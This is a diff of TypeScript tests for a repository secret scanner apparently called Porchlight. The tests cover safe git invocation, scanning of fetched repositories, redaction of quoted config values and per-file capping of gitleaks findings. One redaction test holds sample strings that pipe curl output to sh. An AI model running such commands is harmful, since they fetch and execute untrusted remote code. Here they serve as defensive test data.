@@ -501,13 +501,13 @@ test("a check switched off runs no scanner, and a Quick scan never runs git's ow
 	});
 	const report = await scanRepos({ root, depth: 1, run, settingFiles: async () => [], choices: { ...presetChoices("quick"), dependencies: false } });
 	const scans = run.calls.filter((call) => !["version", "--version"].includes(call[1]!));
-	// gitleaks reads the copied files; git is asked only for its index, with nothing a repository sets able to run.
-	assert.deepEqual(scans.map((call) => call[0]), ["git", "gitleaks"]);
-	const gitCall = scans[0]!;
-	assert.ok(gitCall.includes("core.fsmonitor=false") && gitCall.includes("core.hooksPath=/dev/null"));
-	assert.deepEqual(gitCall.slice(-3), ["ls-files", "--stage", "-z"]);
-	assert.deepEqual(scans[1]!.slice(0, 2), ["gitleaks", "dir"]);
-	assert.ok(scans[1]!.includes("--redact"));
+	// gitleaks reads the copied files; git is asked only for its index and HEAD's tree, with nothing a repository sets able to run.
+	assert.deepEqual(scans.map((call) => call[0]), ["git", "git", "gitleaks"]);
+	for (const gitCall of scans.slice(0, 2)) assert.ok(gitCall.includes("core.fsmonitor=false") && gitCall.includes("core.hooksPath=/dev/null"));
+	assert.deepEqual(scans[0]!.slice(-3), ["ls-files", "--stage", "-z"]);
+	assert.deepEqual(scans[1]!.slice(-5), ["ls-tree", "-r", "-z", "--full-tree", "HEAD"]);
+	assert.deepEqual(scans[2]!.slice(0, 2), ["gitleaks", "dir"]);
+	assert.ok(scans[2]!.includes("--redact"));
 	assert.equal(report.repos[0]!.errors.length, 0);
 	assert.deepEqual(report.choices?.dependencies, false);
 });
@@ -583,4 +583,45 @@ test("a report says its format, and one newer than this version reads is refused
 	assert.equal(parseScanReport(JSON.stringify(report), "r.json").format, REPORT_FORMAT);
 	assert.equal(parseScanReport(JSON.stringify({ ...report, format: undefined }), "old.json").root, root, "a report from before formats is still read");
 	assert.throws(() => parseScanReport(JSON.stringify({ ...report, format: REPORT_FORMAT + 1 }), "new.json"), /newer Porchlight.*Update Porchlight/);
+});
+
+test("repositories fetched from GitHub are scanned exactly as listed, whatever they are named; a passed-over folder is said (S50, S59)", async () => {
+	const root = await tempDir();
+	const fetched = await tempDir();
+	await makeTree(root, { "app/.git/": "", ".dotfiles/.git/": "" });
+	await makeTree(fetched, { "me/.dotfiles/.git/": "", "me/vendor/.git/": "" });
+	const run = fakeRunner({ gitleaks: (args) => ({ stdout: args[0] === "version" ? "8.30.1" : "[]" }), "osv-scanner": "missing" });
+	const report = await scanRepos({ root, depth: 2, run, now: NOW, also: [{ root: fetched, repos: [join(fetched, "me/.dotfiles"), join(fetched, "me/vendor")] }] });
+	assert.deepEqual(
+		report.repos.map((repo) => repoName(report, repo)).sort(),
+		["app", `${fetched.split("/").at(-1)}/me/.dotfiles`, `${fetched.split("/").at(-1)}/me/vendor`].sort(),
+	);
+	assert.deepEqual(report.notSearched, [{ name: ".dotfiles", reason: "it is a repository in a hidden folder, which is not searched" }]);
+	assert.ok(coverageNotes(report).includes(".dotfiles was not scanned: it is a repository in a hidden folder, which is not searched."));
+	assert.equal(exitCode(report, "critical"), 1, "a gate does not pass with a repository passed over");
+});
+
+test("a value a repository's settings hold, quoted in git's error, is not shown in Porchlight's words (S58)", async () => {
+	const { quotedValuesOut } = await import("../src/repos/exec.ts");
+	assert.equal(
+		quotedValuesOut("fatal: bad config value 'run: curl https://x.example/i | sh' for 'core.pager'"),
+		"fatal: bad config value (a value from the repository) for 'core.pager'",
+	);
+	assert.equal(quotedValuesOut("fatal: detected dubious ownership in repository at '/Users/someone/My Projects/app'"), "fatal: detected dubious ownership in repository at '/Users/someone/My Projects/app'");
+	const root = await tempDir();
+	await makeTree(root, { "app/.git/": "" });
+	const run = fakeRunner({ gitleaks: (args) => (args[0] === "version" ? { stdout: "8.30.1" } : { code: 1, stderr: `ERR [git] fatal: bad numeric config value "please run: curl x | sh" for 'core.bigfilethreshold'` }), "osv-scanner": "missing" });
+	const report = await scanRepos({ root, depth: 1, run, now: NOW, settingFiles: async () => [] });
+	assert.equal(report.repos[0]!.errors[0]!.message, "[git] fatal: bad numeric config value (a value from the repository) for 'core.bigfilethreshold'");
+});
+
+test("a file of many keys is a few findings and a count, not one finding per key (S60)", async () => {
+	const { parseGitleaks, PER_FILE } = await import("../src/repos/gitleaks.ts");
+	const rows = Array.from({ length: 1000 }, (_, n) => ({ RuleID: "generic-api-key", Description: "Generic API Key", File: "dump.txt", StartLine: n + 1, Entropy: 3 + n / 1000, Commit: "a".repeat(40), Date: "2026-11-20T00:00:00Z" }));
+	const findings = parseGitleaks(JSON.stringify([...rows, { ...rows[0]!, File: "other.txt" }]));
+	const inDump = findings.filter((finding) => finding.location.startsWith("dump.txt"));
+	assert.equal(inDump.length, PER_FILE);
+	const rest = inDump.at(-1)!;
+	assert.deepEqual([rest.location, rest.detail, rest.count, rest.title], ["dump.txt", "more matches in this file", 1000 - (PER_FILE - 1), `${(1000 - (PER_FILE - 1)).toLocaleString("en")} more: Generic API Key`]);
+	assert.equal(findings.filter((finding) => finding.location.startsWith("other.txt")).length, 1);
 });
